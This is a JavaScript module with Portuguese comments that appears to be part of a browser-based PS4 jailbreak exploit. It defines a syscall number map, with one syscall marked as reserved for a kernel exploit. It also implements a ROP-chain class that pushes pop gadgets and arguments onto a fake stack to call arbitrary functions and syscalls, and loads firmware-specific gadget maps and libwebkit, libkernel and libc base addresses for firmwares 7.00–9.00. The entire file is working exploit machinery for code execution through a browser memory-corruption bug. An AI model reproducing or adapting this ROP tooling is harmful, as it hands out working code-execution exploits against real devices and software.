//chain.mjs

import { Int, lohi_from_one } from './int64.mjs'; // Importa Int e lohi_from_one
import { get_view_vector, init_syscall_array } from './module/memtools.mjs'; // Importa get_view_vector e init_syscall_array
import { Addr } from './mem.mjs'; // Importa Addr
import * as config from '../config.mjs'; // Importa configurações
import { KB } from './constants.mjs'; // Importa KB para tamanhos de memória

// Mapeamento de nomes de syscalls para seus números.
export const syscall_map = new Map(Object.entries({
    'read' : 3,
    'write' : 4,
    'open' : 5,
    'close' : 6,
    'getpid' : 20,
    'setuid' : 23,
    'getuid' : 24,
    'accept' : 30,
    'pipe' : 42,
    'ioctl' : 54,
    'munmap' : 73,
    'mprotect' : 74,
    'fcntl' : 92,
    'socket' : 97,
    'connect' : 98,
    'bind' : 104,
    'setsockopt' : 105,
    'listen' : 106,
    'getsockopt' : 118,
    'fchmod' : 124,
    'socketpair' : 135,
    'fstat' : 189,
    'getdirentries' : 196,
    '__sysctl' : 202,
    'mlock' : 203,
    'clock_gettime' : 232,
    'nanosleep' : 240,
    'sched_yield' : 331,
    'kqueue' : 362,
    'kevent' : 363,
    'rtprio_thread' : 466,
    'mmap' : 477,
    'ftruncate' : 480,
    'shm_open' : 482,
    'cpuset_getaffinity' : 487,
    'cpuset_setaffinity' : 488,
    'jitshm_create' : 533,
    'jitshm_alias' : 534,
    'evf_create' : 538,
    'evf_delete' : 539,
    'evf_set' : 544,
    'evf_clear' : 545,
    'set_vm_container' : 559,
    'dmem_container' : 586,
    'dynlib_dlsym' : 591,
    'dynlib_get_list' : 592,
    'dynlib_get_info' : 593,
    'dynlib_load_prx' : 594,
    'randomized_path' : 602,
    'budget_get_ptype' : 610,
    'thr_suspend_ucontext' : 632,
    'thr_resume_ucontext' : 633,
    'blockpool_open' : 653,
    'blockpool_map' : 654,
    'blockpool_unmap' : 655,
    'blockpool_batch' : 657,
    // syscall 661 é não implementado, livre para uso por kernel exploit ('kexec')
    'aio_submit' : 661,
    'kexec' : 661,
    'aio_multi_delete' : 662,
    'aio_multi_wait' : 663,
    'aio_multi_poll' : 664,
    'aio_multi_cancel' : 666,
    'aio_submit_cmd' : 669,
    'blockpool_move' : 673,
}));

// Gadgets pop para argumentos (rdi, rsi, rdx, rcx, r8, r9).
const argument_pops = [
    'pop rdi; ret',
    'pop rsi; ret',
    'pop rdx; ret',
    'pop rcx; ret',
    'pop r8; ret',
    'pop r9; ret',
];

// ROP chain manager base class.
export class ChainBase {
    constructor(stack_size = 0x1000, upper_pad = 0x10000) {
        this._is_dirty = false; // Flag para indicar se a cadeia já foi executada.
        this.position = 0; // Posição atual na pilha da cadeia.

        const return_value = new Uint32Array(4); // Buffer para valor de retorno (rax e rdx).
        this._return_value = return_value;
        this.retval_addr = get_view_vector(return_value); // Endereço do buffer de retorno.

        const errno = new Uint32Array(1); // Buffer para errno.
        this._errno = errno;
        this.errno_addr = get_view_vector(errno); // Endereço do buffer de errno.

        const full_stack_size = upper_pad + stack_size; // Tamanho total da pilha.
        const stack_buffer = new ArrayBuffer(full_stack_size); // Buffer da pilha.
        const stack = new DataView(stack_buffer, upper_pad); // DataView da pilha.
        this.stack = stack;
        this.stack_addr = get_view_vector(stack); // Endereço da pilha.
        this.stack_size = stack_size;
        this.full_stack_size = full_stack_size;
    }

    // Esvazia a cadeia, sem limpar a flag 'dirty'.
    empty() {
        this.position = 0;
    }

    // Getter para a flag 'dirty'.
    get is_dirty() {
        return this._is_dirty;
    }

    // Limpa a flag 'dirty'.
    clean() {
        this._is_dirty = false;
    }

    // Define a flag 'dirty'.
    dirty() {
        this._is_dirty = true;
    }

    // Verifica se a cadeia pode ser executada.
    check_allow_run() {
        if (this.position === 0) {
            throw Error('chain is empty');
        }
        if (this.is_dirty) {
            throw Error('chain already ran, clean it first');
        }
    }

    // Reseta a cadeia (esvazia e limpa a flag dirty).
    reset() {
        this.empty();
        this.clean();
    }

    // Retorna o valor de retorno como inteiro assinado de 32 bits.
    get retval_int() {
        return this._return_value[0] | 0;
    }

    // Retorna o valor de retorno como um objeto Int (64 bits).
    get retval() {
        return new Int(this._return_value[0], this._return_value[1]);
    }

    // Retorna o valor de retorno como um objeto Addr (ponteiro).
    get retval_ptr() {
        return new Addr(this._return_value[0], this._return_value[1]);
    }

    // Define o valor de retorno.
    set retval(value) {
        const values = lohi_from_one(value);
        const retval = this._return_value;
        retval[0] = values[0];
        retval[1] = values[1];
    }

    // Retorna todos os valores de retorno (rax e rdx) como array de Int.
    get retval_all() {
        const retval = this._return_value;
        return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
    }

    // Define todos os valores de retorno (rax e rdx).
    set retval_all(values) {
        const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
        const retval = this._return_value;
        retval[0] = a[0];
        retval[1] = a[1];
        retval[2] = b[0];
        retval[3] = b[1];
    }

    // Retorna o valor de errno.
    get errno() {
        return this._errno[0];
    }

    // Define o valor de errno.
    set errno(value) {
        this._errno[0] = value;
    }

    // Adiciona um valor (gadget ou argumento) à pilha da cadeia.
    push_value(value) {
        const position = this.position;
        if (position >= this.stack_size) {
            throw Error(`no more space on the stack, pushed value: ${value}`);
        }

        const values = lohi_from_one(value);
        const stack = this.stack;
        stack.setUint32(position, values[0], true);
        stack.setUint32(position + 4, values[1], true);

        this.position += 8;
    }

    // Obtém o endereço de um gadget pela sua string de instrução.
    get_gadget(insn_str) {
        const addr = this.gadgets.get(insn_str);
        if (addr === undefined) {
            throw Error(`gadget not found: ${insn_str}`);
        }

        return addr;
    }

    // Adiciona o endereço de um gadget à pilha da cadeia.
    push_gadget(insn_str) {
        this.push_value(this.get_gadget(insn_str));
    }

    // Adiciona uma chamada de função (com argumentos) à pilha da cadeia.
    push_call(func_addr, ...args) {
        if (args.length > 6) { // Limite de 6 argumentos (convenção de chamada x64).
            throw TypeError(
                'push_call() does not support functions that have more than 6'
                + ' arguments');
        }

        for (let i = 0; i < args.length; i++) { // Adiciona gadgets pop e argumentos.
            this.push_gadget(argument_pops[i]);
            this.push_value(args[i]);
        }

        // Alinha a pilha para 16 bytes antes da chamada (convenção SysV).
        if ((this.position & (0x10 - 1)) !== 0) {
            this.push_gadget('ret');
        }

        if (typeof func_addr === 'string') { // Se o endereço for uma string (nome de gadget).
            this.push_gadget(func_addr);
        } else { // Se for um endereço numérico (Int/Addr).
            this.push_value(func_addr);
        }
    }

    // Adiciona uma chamada de syscall (com argumentos) à pilha da cadeia.
    push_syscall(syscall_name, ...args) {
        if (typeof syscall_name !== 'string') {
            throw TypeError(`syscall_name not a string: ${syscall_name}`);
        }

        const sysno = syscall_map.get(syscall_name); // Obtém o número da syscall.
        if (sysno === undefined) {
            throw Error(`syscall_name not found: ${syscall_name}`);
        }

        const syscall_addr = this.syscall_array[sysno]; // Obtém o endereço da syscall.
        if (syscall_addr === undefined) {
            throw Error(`syscall number not in syscall_array: ${sysno}`);
        }

        this.push_call(syscall_addr, ...args);
    }

    // Define as propriedades de classe necessárias (gadgets e array de syscalls).
    static init_class(gadgets, syscall_array = []) {
        this.prototype.gadgets = gadgets;
        this.prototype.syscall_array = syscall_array;
    }

    // --- START: Implementation-dependent parts ---
    // Essas partes são específicas da forma como a cadeia ROP é iniciada e finalizada no ambiente alvo.

    // Método a ser implementado pela subclasse para lançar a cadeia ROP.
    run() {
        throw Error('not implemented');
    }

    // Tudo que precisa ser feito antes da cadeia ROP retornar para JavaScript.
    push_end() {
        throw Error('not implemented');
    }

    // Adiciona lógica para obter o valor de errno.
    push_get_errno() {
        throw Error('not implemented');
    }

    // Adiciona lógica para limpar o valor de errno.
    push_clear_errno() {
        throw Error('not implemented');
    }

    // Adiciona lógica para obter o valor do registrador RAX (valor de retorno principal).
    push_get_retval() {
        throw Error('not implemented');
    }

    // Adiciona lógica para obter os valores dos registradores RAX e RDX.
    push_get_retval_all() {
        throw Error('not implemented');
    }

    // --- END: Implementation-dependent parts ---

    // Executa uma chamada de função através da cadeia ROP.
    do_call(...args) {
        if (this.position) {
            throw Error('chain not empty');
        }
        try {
            this.push_call(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    // Variante de do_call que não retorna valor.
    call_void(...args) {
        this.do_call(...args);
    }

    // Variante de do_call que retorna um inteiro assinado de 32 bits.
    call_int(...args) {
        this.do_call(...args);
        return this._return_value[0] | 0;
    }

    // Variante de do_call que retorna um objeto Int (64 bits).
    call(...args) {
        this.do_call(...args);
        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    // Executa uma syscall através da cadeia ROP.
    do_syscall(...args) {
        if (this.position) {
            throw Error('chain not empty');
        }
        try {
            this.push_syscall(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    // Variante de do_syscall que não retorna valor.
    syscall_void(...args) {
        this.do_syscall(...args);
    }

    // Variante de do_syscall que retorna um inteiro assinado de 32 bits.
    syscall_int(...args) {
        this.do_syscall(...args);
        return this._return_value[0] | 0;
    }

    // Variante de do_syscall que retorna um objeto Int (64 bits).
    syscall(...args) {
        this.do_syscall(...args);
        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    // Variante de do_syscall que retorna um objeto Addr (ponteiro).
    syscall_ptr(...args) {
        this.do_syscall(...args);
        const retval = this._return_value;
        return new Addr(retval[0], retval[1]);
    }

    // Executa uma syscall, limpando errno antes e lançando erro se errno for diferente de 0.
    do_syscall_clear_errno(...args) {
        if (this.position) {
            throw Error('chain not empty');
        }
        try {
            this.push_clear_errno();
            this.push_syscall(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    // Variante de do_syscall_clear_errno que retorna um inteiro assinado de 32 bits.
    sysi(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }

        return this._return_value[0] | 0;
    }

    // Variante de do_syscall_clear_errno que retorna um objeto Int (64 bits).
    sys(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }

        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    // Variante de do_syscall_clear_errno que retorna um objeto Addr (ponteiro).
    sysp(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }

        const retval = this._return_value;
        return new Addr(retval[0], retval[1]);
    }

}

// Obtém o endereço de um gadget de um mapa de gadgets.
export function get_gadget(map, insn_str) {
    const addr = map.get(insn_str);
    if (addr === undefined) {
        throw Error(`gadget not found: ${insn_str}`);
    }

    return addr;
}

// Carrega o módulo específico da firmware.
function load_fw_specific(version) {
    if (version & 0x10000) { // Verifica se é PS5 (ainda não suportado).
        throw RangeError('ps5 not supported yet');
    }

    const value = version & 0xffff;
    // Não suporta firmwares muito antigas (< 7.00).
    if (value < 0x700) {
        throw RangeError("PS4 firmwares < 7.00 isn't supported");
    }

    // Se a versão estiver entre 8.00 e 9.00 (inclusive), importa o módulo 900.mjs.
    if (value >= 0x800 && value <= 0x900) {
        return import('../900.mjs');
    }

    throw RangeError('firmware not supported');
}

export let gadgets = null; // Mapa global de gadgets.
export let libwebkit_base = null; // Endereço base da libwebkit.
export let libkernel_base = null; // Endereço base da libkernel.
export let libc_base = null; // Endereço base da libc.
export let init_gadget_map = null; // Função para inicializar o mapa de gadgets.
export let Chain = null; // Classe Chain específica da firmware.

// Inicializa a cadeia ROP, carregando o módulo específico da firmware.
export async function init() {
    const module = await load_fw_specific(config.target);
    Chain = module.Chain;
    module.init(Chain);
    ({ // Desestrutura as exportações do módulo da firmware.
        gadgets,
        libwebkit_base,
        libkernel_base,
        libc_base,
        init_gadget_map,
    } = module);
}
